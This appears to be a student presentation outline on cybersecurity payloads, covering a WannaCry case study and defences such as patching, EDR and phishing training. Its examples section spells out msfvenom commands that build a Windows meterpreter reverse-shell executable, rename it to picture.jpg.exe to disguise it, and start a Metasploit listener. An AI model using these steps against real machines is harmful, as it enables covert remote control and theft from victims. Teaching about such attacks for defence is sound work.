# Payload-cybersecurity-presentation
A cybersecurity project defense on payloads.

## Introduction 
In cybersecurity payloads refers to malicious software that performs an attack on a system once it is compromised. Understanding payloads helps defenders detect and prevent cyber attacks, in other words to defend against the enemy, you first understand their weapons.
---
## Objective
To explain what payload is in cybersecurity.
To describe how attackers use payload.
To demonstrate defensive methods.
---
## How payloads work
Attacker finds a vulnerability.
Exploit is delivered.
Payload is executed.
Attacker achieves their objective (data theft, enccryption, remote control).
---
## Commands  / Examples

'''bash
# to create payload 
Use metasploit venom.
Msfvenom -p windows/meterpreter/reverse_tcp lhost(public ip) lport=(port number) -f exe > picture.exe
ls
Show options
Mv picture.exe picture.jpg.exe
ls
# to launch the attack
Msfconsole
Use exploit/multi/handler
Set payload windows/meterpreter/reverse_tcp
Show options
Set lhost (ip of the attacker)
Run

## Defense Strategies 
Keep systems updated and patched
Use antivirus and firewalls
Use endpoint detention and response(EDR) tools
Keep secure backup offline
Windows defender
Train users to recognize phising and suspicious attachments.

## Case study: Wannacry (2017)
Vector: SMB expoit (MS17-010) 
Payload: File encryption and ransom demand
Impact: Hundreds of thousands of system infected globally
Lesson: Patch management and packups are critical

## References
Advanced cybersecurity from networs to defense
NIST cybersecurity framework
OWASP-https://owasp.org
CISA-https:cisa.gov  
